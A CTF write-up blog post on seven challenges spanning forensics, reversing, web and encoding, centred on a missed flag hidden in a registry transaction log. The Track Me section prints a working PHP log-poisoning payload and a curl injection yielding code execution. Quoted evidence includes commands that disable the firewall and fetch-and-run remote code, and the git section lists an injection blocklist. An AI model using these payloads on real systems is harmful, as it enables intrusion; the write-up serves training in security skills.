---
title: "What I learned from a seven-challenge CTF (and the one flag I missed)"
description: "Notes from SkillBit's Flash CTF: seven challenges across forensics, reversing, web and misc. Six of them fell in a few minutes each, and the seventh taught me something, because my registry parser was a leaky abstraction over the evidence and it leaked silently."
date: "2026-09-26"
tags: ["ctf", "ctf-writeup", "forensics", "windows-registry", "registry-transaction-log", "reverse-engineering", "web-security"]
---

SkillBit ran a Flash CTF on September 24, 2026: seven challenges, a few hours of budget, and I got six of them. I'm writing this up mostly because of the seventh, which is the kind of mistake worth writing down. I've made some version of it before and I'd like to make it less often.

Roughly: my tooling was a leaky abstraction over the actual evidence, and when it leaked, it did so silently. I ended up trusting a 101 MB text rendering of a registry hive over the bytes of the registry hive itself, and those two disagree in exactly the situation this challenge was built around. More on that below, at some length.

The other six are fun in their own right, and each one is a slightly different flavor of "the answer was already in the artifact, you just had to look at the right layer," so I'll go through them too, roughly in the order I did them. If you're only here for the failure, skip to Registry 101.

One caveat before we start. I keep run logs while I work (commands, real output, dead ends), so most of what follows is reconstructed from those rather than from memory. Where I'm reporting something the published writeup says rather than something I captured myself, I'll flag it.

## The board

| Challenge | Result | Flag |
|---|---|---|
| careless-talk | Solved | `SkillBit{c4r3l355_t4lk_c05t5_l1v35}` |
| carry-on | Solved | `SkillBit{0n3_f1l3_c4n_c4rry_4n0th3r}` |
| coilvm | Solved | `SkillBit{n4nom1tes_eat_y0ur_symb0lic_execut0r}` |
| git-sleuth | Solved | `SkillBit{R3m3mb3r_t0_4lw4ys_3sc4p3_G1t_C0mm4nds}` |
| track-me | Solved | `SkillBit{7r4ck1n9_u53r5_c4n_7r4ck_y0u_t00}` |
| ways-to-lie | Solved | `SkillBit{4m0n9_100_W4y5_70_L13_Y0u_4ctu4lly_F0und_7h3_7ru7h}` |
| registry101 | **Missed** | `!MetaCTF{F1r5t_st3p_2_r3g1stry_4and6}` |

Two things about that table are worth pointing out before we get into the details.

The flag prefix isn't consistent. Six flags say `SkillBit{...}` and one says `!MetaCTF{...}`, with a leading exclamation mark. I assumed a single format for the whole event and that assumption cost me the miss, which is annoying precisely because it was an assumption I never noticed I was making.

And the challenge I missed was the only one whose evidence contained no literal flag string anywhere. Every other challenge had something to grep for, and in this one there wasn't, which I let convince me that there was nothing there at all. That's the wrong conclusion to draw, and I'll show you the version of it that actually works.

## Careless Talk: the flag is sitting in the binary

This was the 50-point warmup and it took about two minutes. One 37,056-byte x86-64 PIE, unstripped. I can't execute x86-64 binaries on this machine at all (the linux/amd64 Docker emulation just hangs), so everything I do with a binary on this host has to be static, which turned out not to matter here:

```
$ strings -a careless-talk | grep -n 'FLAG_'
27:FLAG_A=SkillBit{c4r3l355_t4lk_
416:FLAG_B=c05t5_l1v35}
```

That's the whole challenge. A program that checks your input against a hardcoded credential has to carry that credential, and the naming convention gives up the rest: `FLAG_A` implies a `FLAG_B`, and the success message sitting in the same dump is `Watchword accepted. %s%s`, which says the program prints both pieces back to back. Concatenate them in the order the file gives you and you get `SkillBit{c4r3l355_t4lk_c05t5_l1v35}`.

The takeaway I'd generalize (and I'll come back to it a few times): run `strings` first. Before the disassembler, before any attempt to execute, because it answers one cheap question. Is the secret data, or is it logic? Here it's data, and the rest of the challenge evaporates once you know that.

## Carry On: a ZIP appended to a PNG

This one was 100 points and it's a nice little illustration of why "the file opened fine" is not a fact about the file.

The handout is a 65,163-byte PNG of an airport screening hall floor plan. It opens in any viewer. The drawing has nothing to do with the answer.

```
$ shasum -a 256 checkpoint-plan.png
d19c4c9bd1438ee7eb6427918f0f6838cc0d9723f955a7fa0fcc8706ecd3072a
$ strings -a checkpoint-plan.png | grep -i skillbit
$
```

That empty result is the kind of thing I've learned to explain rather than accept, because "I grepped it and got nothing" is not the same as "there's nothing there." The tell isn't in the strings, it's in the structure. Walking the PNG chunks gives:

```
IHDR@8 len=13 | tEXt@33 len=29 | tEXt@74 len=58 | IDAT@144 len=64237 | IEND@64393 len=0
```

with every CRC valid. `IEND` carries 0 bytes of data, and the last twelve bytes of any PNG are that chunk plus its CRC, so the image ends at exactly 64,405. The file is 65,163 bytes long, which leaves 758 bytes unaccounted for, and `d[64405:64409]` happens to be `PK\x03\x04`, the local file header of a ZIP entry.

Carve there and read the member:

```
$ /Users/zizzle/Documents/ctf/.venv/bin/python extract.py    # writes extracted/note.txt
$ grep -o 'SkillBit{[^}]*}' extracted/note.txt
SkillBit{0n3_f1l3_c4n_c4rry_4n0th3r}
```

I verified the carve two independent ways, because the obvious check doesn't work. The local header CRC equals `zlib.crc32(plaintext)` = `0x49d7cf3b`, and the declared uncompressed size is 1,078 bytes, which is what came out. The reason that matters: carving at 64,400 or even 64,200 still opens the ZIP, because `zipfile` scans backwards for the end-of-central-directory record and tolerates arbitrary leading junk. "The ZIP opens" is not evidence that your offset is right. The chunk walk is.

Two more small things, both of which I've filed away. Compression is also why `strings` found nothing: the note is DEFLATE-compressed, so its text doesn't exist as text inside the carrier. And the compressed payload is a good reminder that `strings` is a triage tool, not an oracle.

## CoilVM: a nanomite crackme with no equations

CoilVM is a stripped x86-64 ELF that reads a password from stdin and prints a flag if it's right. What makes it interesting is that the comparison function contains almost no logic. It's a wall of `int3` breakpoints, and the real per-byte check lives in the SIGTRAP handler, which re-keys itself with a running FNV-1a hash after every accepted byte. There's no flat system of equations here for a solver like Z3 to consume, which I assume is the entire point of the design.

Same constraint as Careless Talk: no x86-64 execution available, so the machine has to come out of a disassembler.

```
$ export PATH="/opt/homebrew/opt/binutils/bin:$PATH"
$ objdump -d -M intel --no-show-raw-insn coilvm > text.dis
$ grep -c 'int3' text.dis
36
```

Thirty-six trap sites at `0x4012d7 + 0x17*k` for k = 0 through 35, one per password byte. The handler at `0x401196` reads the trapped RIP out of the signal context with `mov rdi,[rdx+0xa8]`. That offset isn't me guessing at a struct layout, it's written in the instruction, which is one of the things I like about disassembly as documentation. It also explains why there's no RIP fix-up anywhere in the handler: `int3` is a trap rather than a fault, so the saved context already points one byte past the breakpoint, and the handler can simply return and let the next site fire.

The check, read out of the instruction stream, is:

```
rol8(in ^ (state & 0xFF), (state >> 5) & 7) == NM_ENC[i] ^ (state & 0xFF)
state = (state ^ in) * 0x01000193        # FNV-1a, basis 0x811c9dc5
```

Every operation is invertible, so the 36-byte password falls out in a single forward pass and no brute force is required. I wrote a model of the handler, but instead of hardcoding its constants I re-derive them from the ELF, and the script exits 0 only if it passes an exhaustive 256-way cross-check per byte plus a negative test that flips one bit of the recovered winding and confirms the ratchet rejects it. The reasoning there is that a model of a reversing challenge is only as correct as my reading of the disassembly, so the self-check should fail loudly when the reading is wrong.

The decoy is my favorite part of this one. `strings` turns up `C01L_VM_d3c0y_d0_n0t_b3l13v3_th15_str1ng` in `.rodata`, and the challenge name warns you not to believe it. It's bait for a `strings | strcmp` guess, and what makes it good bait is that a plausible-looking leet string is exactly what you find when a challenge is too easy. I rejected it on evidence rather than on suspicion: `grep -c 'call   401614'` returns 0, so nothing in the binary ever reaches the routine that would compare against it.

Flag: `SkillBit{n4nom1tes_eat_y0ur_symb0lic_execut0r}`.

## Git Sleuth: 500 decoys that collapse to one hash

This one is a service over a raw TCP connection. Every line you type is executed as `git <line>`, but only after it passes a blacklist of banned characters and keywords. The banned read verbs are `diff`, `patch`, `grep`, `push`, `remote` and `update-ref`. The banned substrings include `flag`, `Fake`, `Flag`, `For` and `Testing`. The banned metacharacters include `|`, `$`, `&`, `;`, `(`, `)`, `*`, `#`, backtick, and even `./`.

I should state a bias up front: blocklists are usually the wrong tool, and this challenge is a clean little demonstration of why. The problem isn't any individual entry, it's that `git` is a family of dozens of subcommands with their own flags and aliases, and the space of ways to read a file out of a repository is much larger than the space of ways someone thought to ban. Ban `grep` and I still have `ls-files -s`, and in this repository those two do the same job.

I checked ground truth before building anything, mostly so I wouldn't write a tool around a wrong assumption:

```
----- SENT: -C / log
fatal: not a git repository (or any of the parent directories): .git
----- SENT: -c foo=bar version
git version 2.47.3
```

So `-C` passes the filter, and the target directory is writable. Enumerate it, then stage it:

```
----- SENT: -C /tmp ls-files --others --directory --no-empty-directory
0012d10544b675b58db06df7e5a357c7.txt
015f6f3cd92aef1f6bdefda5afadcd8b.txt
020d435afde9333d1003c9fab7da77c1.txt
```

Five hundred md5-named `.txt` files, and nothing tracked yet. Then `-C /tmp init`, `-C /tmp add .`, `-C /tmp commit -m meow`, and the listing that actually does the work:

```
----- SENT: -C /tmp ls-files -s
100644 937fc2f3a9653a549fe41c35f4e3102c02a3cad9 0  0012d10544b675b58db06df7e5a357c7.txt
100644 937fc2f3a9653a549fe41c35f4e3102c02a3cad9 0  015f6f3cd92aef1f6bdefda5afadcd8b.txt
100644 937fc2f3a9653a549fe41c35f4e3102c02a3cad9 0  020d435afde9333d1003c9fab7da77c1.txt
```

All 500 decoys hold the same string, so git hashes them to the same blob, and 501 index entries collapse into this:

```
500  937fc2f3a9653a549fe41c35f4e3102c02a3cad9
  1  35ab8c9e8787383f759aae2db4ee654c73080548
```

The hash that appears exactly once is the flag file. Its name is regenerated for every instance so it can't be known in advance, but `git show <that path>` resolves it against HEAD and prints the body. The general shape of this is what I want to remember: hiding a secret among 500 lookalikes stops being protection the moment the attacker can group by content instead of reading filenames. The decoys only look like a crowd if you insist on examining them one at a time.

Flag: `SkillBit{R3m3mb3r_t0_4lw4ys_3sc4p3_G1t_C0mm4nds}`.

## Track Me: a log viewer that includes its own log

Track Me is a small visitor analytics site. Every request appends the client's User-Agent to `logs/access.log`, and the log viewer hands that same file to PHP's `include()`. The comment in the source above the call is refreshingly honest about the tradeoff the author thought they were making:

```php
// Safe include: only include files that are explicitly present in the logs directory
// This allows PHP in logs to execute, but prevents path traversal and LFI.
ob_start();
include $path;
$rendered = ob_get_clean();
```

The whitelist decides which file gets loaded. It says nothing at all about what's inside that file, and half of `access.log` is written by whoever makes the request. So the traversal defense is thorough and completely irrelevant: you don't need to reach another file, you need to put PHP into this one.

The payload I used:

```
zxq9k2<?php echo "ZXQ9K2:"; foreach(glob("/flag-*") as $f){echo $f,":"; echo @file_get_contents($f);} ?>
```

Three details in there are doing work. The `zxq9k2` prefix is a marker so I can find my own output in a log that is mostly other people's requests. The `glob` finds the flag file, whose name is randomized per container, so nothing has to be copied by hand. And the whole thing is written on one line, because a header value can't carry a newline, so anything with several statements needs `;` separators or a `foreach` written flat.

Send it as a header, then load the viewer and read the log back:

```
$ curl -s -A '<?php echo shell_exec("id"); ?>' 'http://<host>/'
$ curl -s 'http://<host>/logs.php?file=access.log' | grep -o 'uid=.*'
uid=10001(app) gid=10001(app) groups=10001(app)
```

That's code execution as the Apache worker, in a file the application itself wrote, served back by an endpoint the application itself provides. I like this class of bug because nothing is really "bypassed" - every check present does exactly what it claims to do. The flag is `SkillBit{7r4ck1n9_u53r5_c4n_7r4ck_y0u_t00}`.

The general lesson is that a check which validates the container but not the contents isn't a partial mitigation, it's a false sense of one. `basename()`, a filename regex, a `realpath()` and a prefix comparison all pass here, and all four are about the filename rather than the bytes. Any file a client can write into that the server will then `include` is remote code execution with a few extra steps.

## Ways To Lie: emoji, then musical symbols, then nibbles

This is the most crypto-adjacent challenge of the set, and it's a layered encoding where each layer is simple on its own but the stack hides the structure nicely. No service and no binary, just a file.

The handout is a single file of emoji: 1,616 bytes, 404 codepoints, and not text in any useful sense. The codepoints are the tell:

```
$ python3 -c "
t = open('flag.txt', encoding='utf-8').read().strip()
print(len(t), 'codepoints')
print([hex(ord(c)) for c in t[:6]])
print(min(ord(c) for c in t) - 0x1F3F7, max(ord(c) for c in t) - 0x1F3F7)"
404 codepoints
['0x1f4d9', '0x1f490', '0x1f4a5', '0x1f4d9', '0x1f490']
132 240
```

Every codepoint lands between U+1F3F7 + 132 and U+1F3F7 + 240. A file whose characters all sit inside one 256-wide window anchored at a single base is base100, and I'm not aware of anything else that produces that signature.

Peel it off and the second layer is music:

```
$ python3 -c "
notes = bytes((ord(c) - 0x1F3F7) & 0xFF for c in open('flag.txt', encoding='utf-8').read().strip()).decode()
print(len(notes), 'symbols,', len(set(notes)), 'distinct')
print(' '.join(sorted(set(notes), key=ord)))"
120 symbols, 15 distinct
♩ ♪ ♫ ♬ ♭ ♮ ♯ 𝄐 𝄑 𝄒 𝄓 𝄞 𝄡 𝄢 𝄫
```

120 symbols, where a flag of plausible length is about 60 characters, so each symbol is one hex nibble and two of them make a byte. Fifteen distinct symbols instead of sixteen just means one nibble value never occurs in this plaintext, which is a decent reminder not to over-index on round numbers when you're guessing at encodings.

The prefix is free plaintext. `SkillBit{` is `536b696c6c4269747b` in hex, so the first eighteen symbols donate eighteen known nibble values and pin nine of the fifteen symbols. The author also laid the alphabet out so nibble value increases with codepoint, which extends the mapping along runs of consecutive codepoints. My solver pins 9 symbols from the crib, that run rule takes it to 11, and four symbols are left over for the search.

Four symbols against five unused nibbles is a few permutations rather than real cryptanalysis. Twenty-four assignments decode to flag-shaped ASCII, and English is the only thing left to separate them:

```
   2159  SkillBit{4m0n9_100_W4y5_70_L13_Y0u_4ctu4lly_F0und_7h3_7ru7h}
   1808  SkillBit{4m0j9_100_W4y5_70_L13_Y0u_4ctu4lly_F0ujd_7h3_7ru7h}
   1724  SkillBit{4m0n9Z100ZW4y5Z70ZL13ZY0uZ4ctu4llyZF0undZ7h3Z7ru7h}
```

Scoring bigram frequency after de-leeting picks the winner by a wide margin, and the runners-up fail in a satisfying way: one character of drift turns the word separator into a letter, which corrupts "found", "the" and "truth" all at once. The flag is `SkillBit{4m0n9_100_W4y5_70_L13_Y0u_4ctu4lly_F0und_7h3_7ru7h}`.

The solver is at `misc/ways-to-lie/solve.py`. Being honest about provenance: this is the one challenge where I don't have a full transcript from the event, so what's above is the mechanism plus a solver I wrote and ran afterwards to confirm the flag end to end. The stack is what makes this hostile to shortcuts, since base100 output isn't text and the musical layer is a bespoke substitution rather than a known cipher, so there's nothing off the shelf to reach for. Eighteen crib nibbles and one structural assumption about the alphabet carry the entire attack.

## Registry 101: the one I missed, and why

Six challenges down. This is the seventh, the only one that beat me, and the reason I'm writing this post at all. The failure wasn't exotic. A tool told me something confident, plausible and wrong, and I believed it.

The brief: "Peter keeps denying that he ever accessed my important documents - uncover the evidence that proves otherwise." The handout is a 35,467,075-byte KAPE triage collection taken off a Windows 10 workstation.

### What the handout actually was

`file` calls it a ZIP, and the header classifies it immediately: `Created by KAPE version 1.3.0.2 on 2025-09-23T14:14:50Z` means this is a collection of selected files copied off a live host, not a disk image and not a memory dump. That distinction matters later in a way I didn't give enough weight to.

```
307 files, 284,308,117 bytes uncompressed
 12 registry hives, every one regf magic-confirmed
 124 .evtx event logs, 94.4 MB, 124/124 valid ElfFile headers
  1 PSReadline ConsoleHost_history.txt containing:
      netsh advfirewall set allprofiles state off
      irm https://get.activated.win | iex
```

The user profile is the part that should have stopped me:

```
C/Users/admin/NTUSER.DAT        7,864,320 bytes
C/Users/admin/ntuser.dat.LOG1   1,605,632 bytes
C/Users/admin/ntuser.dat.LOG2   3,186,688 bytes
```

A hive and its two transaction logs, handed over together, in a challenge called `registry101`. Here is my own triage note from that evening: "a complete hive set *with transaction logs* (deleted-key recovery is possible) points at hive analysis being the intended path." I wrote that sentence, and then I parsed the hive without its logs, produced a 101 MB text dump, and never came back to the logs. Writing the right note is not the same as acting on it, which is a smaller and more embarrassing version of the real lesson here.

One more thing the collection does not contain: Peter. I byte-scanned all 308 files for `Peter` and for its UTF-16 form and got 6 hits, every one a false positive - `St. Petersburg` in a timezone string, `DisableInPlace`, `ZOrderNonCompete`, `SniffedFolderTyp`, and `PETE` inside `PATENTEDNOTES`. SAM holds `admin`, `Administrator`, `Guest`, `DefaultAccount` and `WDAGUtilityAccount`. So the attribution has to run through `admin` being Peter's session rather than through an actual name. Worth knowing, not the flag, and I mention it mainly because I spent time there that belonged to the logs.

### I answered the wrong question, correctly

Four Word documents in `C:\Users\admin\Documents` open in a 4.4-second burst on 2025-09-23, and four independent registry structures recorded it:

- **Word File MRU** (`HKCU\Software\Microsoft\Office\16.0\Word\File MRU`): four FILETIMEs, decoded UTC - `Create Virtual Hard Drive.docx` 13:58:19.410, `Dwrap.docx` 13:58:21.691, `Giao-an-Talon.docx` 13:58:22.488, `HR_EmployeeList_2019.docx` 13:58:23.877.
- **Reading Locations** (`HKCU\...\Word\Reading Locations\Document 0..3`): all four paths, each stamped `Datetime = 2025-09-23T21:07`.
- **RecentDocs** (`HKCU\...\Explorer\RecentDocs`, plus its `.docx`, `.xlsx`, `.txt`, `.xml` and `Folder` subkeys): the same four docx, plus `HR_EmployeeList_2019.xlsx`, `commande.txt`, `ConsoleHost_history.txt` and `Configuration.xml`, with `MRUListEx` head pointing at the four docx.
- **UserAssist** (`HKCU\...\Explorer\UserAssist\{...}\Count`): `Microsoft.Office.WINWORD.EXE.15` last run 2025-09-23 13:58:21 UTC with run count 4, and `Microsoft.Office.EXCEL.EXE.15` at 13:58:21 UTC with run count 1.

Reading Locations is the one that settles it. Word stamps that key when a file is opened and stamps it again when the file is actually read, which is why it reads 21:07 local (UTC+7) rather than 13:58 UTC. Nine minutes after the opens, all four documents were on screen.

Two implementation details if you try this yourself. UserAssist value names are ROT13, so decode with `codecs.decode(v.name(), 'rot_13')`, and the FILETIME sits at offset 60 of the 72-byte blob on the Windows 10 v5 layout. Getting either of those wrong makes UserAssist look empty, which is a much more comfortable conclusion than it deserves - the second time in this post that an empty result was the interesting thing.

If the question were "prove the access," this is a complete answer. Four independent structures, one 4.4-second window, a read nine minutes later. The suspect is lying and you can say so in court. But there was no flag in that answer, and the challenge wanted a flag.

### Then I invented a flag

Before writing anything down I scanned all 307 files for every flag shape I could think of: `flag{`, `FLAG{`, `CTF{`, `SkillBit`, `metaCTF`, the UTF-16LE encoding of each, their hex, ROT13 of `SkillBit{`, reversed `tiBklliS`, and the ZIP comment. Zero hits.

So I did the thing you shouldn't do in that situation, which is to manufacture an answer. `Reading Locations\Document 0..3` holds the only ISO-8601 token in the hive and it's the exact moment the documents were read, so I submitted `SkillBit{2025-09-23T21:07}` as unverified, with the last-open FILETIME and the filename queued behind it as fallbacks. All three were wrong.

Here's the part I keep chewing on. My scan returned zero hits, and I treated that as a fact about the evidence. It wasn't. It was a fact about my scan: I was searching for the flag in its decoded form, in the files I had chosen to parse. Both of those were my choices, and neither of them was the challenge's.

### Where the flag actually was

Four commands, run after the event:

```bash
$ grep -ac 'IU1ldGFDVEZ7' evidence/C/Users/admin/NTUSER.DAT
0
$ grep -ac 'IU1ldGFDVEZ7' evidence/C/Users/admin/ntuser.dat.LOG1
2
$ printf '%s' 'IU1ldGFDVEZ7RjFyNXRfc3QzcF8=' | base64 -d
!MetaCTF{F1r5t_st3p_
$ printf '%s' 'Ml9yM2cxc3RyeV80YW5kNn0=' | base64 -d
2_r3g1stry_4and6}
```

Here's the raw context, straight out of the log file. Offsets into the 1,605,632-byte log:

| Offset | Encoding | Bytes in the log | What it is |
|---|---|---|---|
| 701238 | ASCII | `IU1ldGFDVEZ7RjFyNXRfc3QzcF8=.docx.lnk` | Shell item for the first file |
| 684034 | UTF-16 | `...\Documents\IU1ldGFDVEZ7RjFyNXRfc3QzcF8=.docx` | RecentDocs entry, full path |
| 704686 | ASCII | `Ml9yM2cxc3RyeV80YW5kNn0=.xlsx.lnk` | Shell item for the second file |
| 704612 | UTF-16 | `...\Documents\Ml9yM2cxc3RyeV80YW5kNn0=.xlsx` | RecentDocs entry, full path |

Two RecentDocs entries whose filenames are not filenames. One decodes to the first half of a flag, the other to the second half, and the pair concatenated is the answer.

My 101 MB `regdump.txt` contains zero occurrences of either string, and the tempting conclusion is that my parser is broken. It isn't. Those two values weren't in the hive yet. They were uncommitted writes.

### The leaky abstraction

This part is worth generalizing, and it's a shape I recognize from debugging machine learning code: everything runs, nothing raises, and the output is wrong.

A registry hive isn't a file, it's a file plus a transaction log. Microsoft's own documentation lays it out in a table: alongside the hive's data file, `.log` is "a transaction log of changes to the keys and value entries in the hive," and the supporting files for `HKEY_CURRENT_USER` are listed as `Ntuser.dat, Ntuser.dat.log`. Windows records changes into the log and merges them into the hive lazily, so a hive copied off a running machine mid-write can leave its newest entries pending in the log, invisible to anything that reads the hive alone. It's the registry version of reading a database mid-transaction and treating the result as the truth.

The official solve goes the other way: point Registry Explorer at `ntuser.dat`, hand it both `.LOG` files, and it replays them at load time, at which point those two entries appear in RecentDocs. Two open-source parsers will do the same replay and I'd reach for either of them next time: yarp, whose README lists "Support for transaction log files," and regipy, which advertises "Apply transaction logs on a registry hive."

The parser I used was python-registry, described by its own README as "a pure Python library that provides read-only access to Windows NT Registry files," with no mention of transaction logs anywhere. That's not a knock on the library, which does exactly what it says on the tin. It's a knock on me for picking a parser whose blind spot was the entire challenge and then trusting its 101 MB rendering of the evidence.

One more detail that argues the same way: in the collection, the log files' modification times precede the hive's. Metadata triage says the logs are stale. The bytes say the logs hold the only copy of the flag. I'll take the bytes.

### Two traps, stacked

**The prefix I assumed.** My marker list covered base64 of `flag{` (`ZmxhZ3s`) and base64 of `SkillBit` (`U2tpbGxCaXQ`). It never covered base64 of `MetaCTF{` (`TWV0YUNURns`). SkillBit is the platform and the brand, and the other six flags in this event all ended in `SkillBit{`, so `SkillBit` is what I scanned for.

**The alignment I never accounted for.** Even the right prefix would have missed, because the encoded payload starts with `!` and that single character shifts the base64 alignment:

```
base64('MetaCTF{')  =  TWV0YUNURns       <- what my scanner looked for
what was on disk    =  IU1ldGFDVEZ7...   <- what the hive actually held
```

`TWV0YUNURns` appears nowhere in `ntuser.dat.LOG1`, which you can check in one line:

```bash
python3 -c "d=open('ntuser.dat.LOG1','rb').read(); print(d.find(b'TWV0YUNURns'), d.find(b'IU1ldGFDVEZ7'))"
# -1 701238
```

Pattern-matching a secret in its encoded form is a bet that the encoder applied no prefix, no salt, no framing and no alignment I failed to anticipate. One leading `!` invalidated the search. And the filenames end in `=` padding immediately before the extension, which is about as loud as a hidden flag gets. I walked past them because I was looking in the wrong file with the wrong needle, which are two separate mistakes that happened to compound.

## What I'd do differently

Practical notes, roughly in order of how much they would have helped:

- **Enumerate every file next to an artifact and say out loud why it exists.** `NTUSER.DAT.LOG1` is not a spare part. If a hive arrives with `.LOG1` and `.LOG2` beside it, uncommitted writes are on the table, and reading the logs is worth more than reading the hive a second time.
- **Byte-scan the raw collection before deciding there's no flag in it.** The parser is an interpretation and the artifact is the source of truth. Three seconds of `grep` over the bytes beats an hour of reasoning about a 101 MB rendering of the wrong view.
- **Decode candidate tokens instead of matching their encoded forms.** Base64 alignment shifts on one leading character, and `=` padding inside a filename is a tell rather than decoration.
- **Take the flag format from the challenge, not from the event.** My notes asserted `SkillBit{...}` and that was right six times, which is exactly why nobody re-checked it on the seventh.
- **Don't stop at the deliverable the prompt names.** "Prove the access" was the setup for the real ask. When the evidence you've gathered convicts the suspect, you've answered the story rather than the challenge.
- **When a challenge hands you a hive, bring a parser that replays logs.** python-registry can't. yarp and regipy can. That's a one-line choice made at triage time that decides whether the newest evidence exists for you at all.

The common thread is the one I keep relearning in other contexts: a tool that answers confidently and a tool that answers correctly are not the same thing, and the difference only shows up at the edges. Empty results and clean runs deserve more suspicion than I give them.

## Conclusion

Seven challenges, six flags, and the one I lost wasn't a failure of things being broken. Everything I needed was in the collection, including 1.6 MB of pending registry writes that I had already extracted, hashed and set aside. I had the artifact and I trusted my rendering of it instead, which is a decision rather than an accident, and it's one I'd like to stop making.

The parts I'd keep are unglamorous and cheap: `strings` first, structure over content, blocklists lose to cousins, validate contents rather than containers. That's usually how it goes with these things.

If you want to see how the intended solve handles the transaction log, the platform's writeups for all seven challenges are linked below.

## References

**Primary Source (all seven challenges):**

- [SkillBit: Flash CTF - Careless Talk](https://skillbit.com/blogs/flash-ctf-careless-talk)
- [SkillBit: Flash CTF - Carry On](https://skillbit.com/blogs/flash-ctf-carry-on)
- [SkillBit: Flash CTF - CoilVM](https://skillbit.com/blogs/flash-ctf-coilvm)
- [SkillBit: Flash CTF - Git Sleuth](https://skillbit.com/blogs/flash-ctf-git-sleuth)
- [SkillBit: Flash CTF - Track Me](https://skillbit.com/blogs/flash-ctf-track-me)
- [SkillBit: Flash CTF - Ways To Lie](https://skillbit.com/blogs/flash-ctf-ways-to-lie)
- [SkillBit: Flash CTF - Registry 101](https://skillbit.com/blogs/flash-ctf-registry-101)

**Technical Resources:**

- [Microsoft Learn: Registry Hives - extension table, `.log` as "a transaction log of changes to the keys and value entries in the hive"](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives)
- [yarp - yet another registry parser ("Support for transaction log files")](https://github.com/msuhanov/yarp)
- [regipy - "Apply transaction logs on a registry hive"](https://github.com/mkorman90/regipy)
- [python-registry - read-only hive parser, no transaction log support](https://github.com/williballenthin/python-registry)
- [Registry - full featured, offline Registry parser in C#](https://github.com/EricZimmerman/Registry)

---

Good luck out there. And when a tool tells you there's nothing there, go look anyway.
